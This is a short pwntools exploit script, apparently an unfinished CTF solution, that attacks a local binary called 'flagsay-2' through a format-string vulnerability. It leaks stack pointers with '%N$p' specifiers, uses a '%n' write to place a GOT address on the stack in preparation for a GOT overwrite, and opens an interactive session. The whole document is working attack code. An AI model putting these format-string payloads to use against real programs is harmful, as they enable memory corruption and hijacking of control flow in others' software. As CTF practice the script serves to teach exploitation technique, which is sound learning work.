from pwn import *

GOT_STRCHAR = 0x8049980

p = process('./flagsay-2')

GDB = """
x/32x $esp
b *0x080486bf
c
"""
#gdb.attach(p, GDB)

# stack addresses; 9, 17, 18, 19, 46...
p.sendline("%9$p %17$p %18$p %19$p %46$p")

# plan:
# A:9,B:17,C:18,D:19 stack addresses
# - Leak A, B, C or D
# - write GOT address there
p.sendline("XYZ|%18$p")
p.recvuntil("XYZ|")
stackA = p.recvn(10)
info("stack A: "+stackA)

# write GOT address on stackA
# 129 bytes before our write
p.sendline("%{}x%18$n".format(GOT_STRCHAR - 129))
gdb.attach(p,"x/1x {}".format(stackA))

p.recvline_startswith(" //")
p.interactive()
